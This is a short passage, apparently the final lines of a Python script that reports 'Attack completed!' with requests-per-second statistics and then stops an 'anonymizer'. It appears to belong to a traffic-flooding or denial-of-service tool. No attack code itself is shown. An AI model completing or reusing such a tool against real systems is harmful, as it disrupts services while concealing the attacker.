        print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")

    if args.results:
        print(f"{GREEN}Results saved to {args.results}{RESET}")

    if args.anonymizer == "start":
        print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
        run_anonymizer("stop")

if __name__ == "__main__":
    asyncio.run(main())
